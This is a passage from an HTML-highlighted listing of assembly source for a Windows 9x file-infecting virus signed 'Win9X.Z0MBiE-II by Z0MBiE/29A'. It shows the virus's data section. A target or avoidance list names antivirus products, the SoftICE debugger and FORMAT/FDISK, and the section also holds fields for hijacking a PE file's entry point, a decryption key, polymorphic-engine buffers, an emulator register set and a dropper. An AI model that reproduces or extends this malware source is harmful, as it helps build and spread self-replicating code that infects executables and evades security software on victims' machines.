</span><span class="sc5">suck_names</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AVP????'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WEB??????'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'DRW??'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'DSAV??????'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'NOD???????EXE'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'NOD???????00?'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'??????????AVC'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'??????????VDB'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WINICE    ???'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FORMAT    COM'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FDISK     EXE'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SCANDSKW  EXE'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'DEFRAG    EXE'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">@@vir_type</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; 1/2</span><span class="sc0">
</span><span class="sc5">@@is_dll</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">@@imagebase</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; saved</span><span class="sc0">
</span><span class="sc5">@@vir_offset</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; offset of virus in file</span><span class="sc0">
</span><span class="sc5">@@vir_rva</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; virus rva in file</span><span class="sc0">
</span><span class="sc5">@@saveeip</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; saved entrypoint rva</span><span class="sc0">
</span><span class="sc5">@@orig_offs</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; where original data stored in file</span><span class="sc0">
</span><span class="sc5">@@orig_rva</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@@codesect_pageaddr12</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@@codesect_pagecount</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@@codesect_flags</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@@decr_key</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@@saved_rel</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Win9X.Z0MBiE-II  by Z0MBiE/29A  X-)  Seek&amp;Enjoy!  z0mbie_29a@yahoo.com'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'made in Moscow, Russia'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[S/N:'</span><span class="sc0">

</span><span class="sc5">gen_number</span><span class="sc0">              </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc5">i</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">10000</span><span class="sc0">
                        </span><span class="sc5">k</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc5">j</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">rept</span><span class="sc0">    </span><span class="sc5">k</span><span class="sc0">
                        </span><span class="sc9">if</span><span class="sc0">      </span><span class="sc4">((</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc5">i</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">ne</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">exitm</span><span class="sc0">
                        </span><span class="sc9">endif</span><span class="sc0">
                        </span><span class="sc5">j</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">j</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc5">i</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">i</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">
                        </span><span class="sc9">rept</span><span class="sc0">    </span><span class="sc5">k</span><span class="sc4">-</span><span class="sc5">j</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">((</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc5">i</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc5">i</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">i</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">

 </span><span class="sc5">gen_number</span><span class="sc0"> </span><span class="sc5">vir_size</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'-'</span><span class="sc0">
 </span><span class="sc5">gen_number</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'-'</span><span class="sc0">
 </span><span class="sc5">gen_number</span><span class="sc0"> </span><span class="sc5">vir_memory</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'-'</span><span class="sc0">
 </span><span class="sc5">gen_number</span><span class="sc0"> </span><span class="sc5">virPages</span><span class="sc0">

        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'-DEBUG'</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">']'</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

                        </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">end_of_code</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">vir_size</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">end_of_code</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">

</span><span class="sc5">entered</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">r0_idt</span><span class="sc0">                  </span><span class="sc9">df</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">kernel_base</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">filename_ptr</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">filename_size</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">260</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">filename_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">short_name_len</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">short_ext_len</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">shortname</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">short_name_len</span><span class="sc4">+</span><span class="sc5">short_ext_len</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">filehandle</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">dta</span><span class="sc0">                     </span><span class="sc5">dta_struc</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">mz</span><span class="sc0">                      </span><span class="sc5">mz_struc</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe</span><span class="sc0">                      </span><span class="sc5">pe_struc</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">oe1</span><span class="sc0">                     </span><span class="sc5">oe_struc</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">oeV_ptr</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">oeV</span><span class="sc0">                     </span><span class="sc5">oe_struc</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">oeL</span><span class="sc0">                     </span><span class="sc5">oe_struc</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">vir_copy</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">vir_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">sd_count</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sd_count_size</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">sd_count</span><span class="sc0">

</span><span class="sc5">poly_entrypoint</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">sd_buf_size</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">4096</span><span class="sc0">
</span><span class="sc5">sd_buf_size_log2</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">12</span><span class="sc0">

</span><span class="sc5">sd_buf</span><span class="sc0">                  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">orig_bytes</span><span class="sc0">              </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">unp_dropper</span><span class="sc0">             </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">poly</span><span class="sc0">                    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">vir_size_infile</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">em_eax</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">em_ecx</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">em_edx</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">em_ebx</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">em_esp</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">em_ebp</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">em_esi</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">em_edi</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">push_num</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">reg1</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">reg2</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">regbuf</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">vir_memory</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">virPages</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">vir_memory</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4095</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0">

                        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">

</span></div></body>
</html>
